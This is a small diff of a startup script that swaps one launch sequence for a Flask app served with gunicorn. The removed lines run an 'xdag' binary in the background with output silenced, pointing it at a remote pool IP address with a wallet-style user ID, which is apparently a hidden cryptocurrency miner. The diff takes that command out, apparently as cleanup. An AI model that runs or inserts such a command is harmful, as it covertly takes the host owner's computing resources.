@@ -1,3 +1,3 @@
-chmod 700 xdag
-nohup ./xdag -a xdag -o 45.86.230.214:60000 -u MkxByQhzg14ao8FFWwQU71tGSmuzEfzXk.CPU >/dev/null 2>&1
-echo success
+pip install flask
+pip install gunicorn
+gunicorn --bind 0.0.0.0:5000 main:app
